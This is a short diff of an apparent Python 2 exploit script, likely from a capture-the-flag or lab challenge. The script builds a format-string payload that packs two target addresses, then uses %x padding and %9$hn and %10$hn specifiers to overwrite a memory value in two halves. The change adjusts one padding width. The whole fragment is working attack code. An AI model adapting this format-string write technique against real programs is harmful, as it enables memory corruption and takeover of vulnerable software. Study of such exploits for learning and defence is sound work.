@@ -8,7 +8,7 @@ exploit += struct.pack("I", CHECK)
 exploit += struct.pack("I", CHECK + 2)
 exploit += '%48871x'
 exploit += '%9$hn'
-exploit += '%73662x'
+exploit += '%8126x'
 exploit += '%10$hn'
 
 print exploit
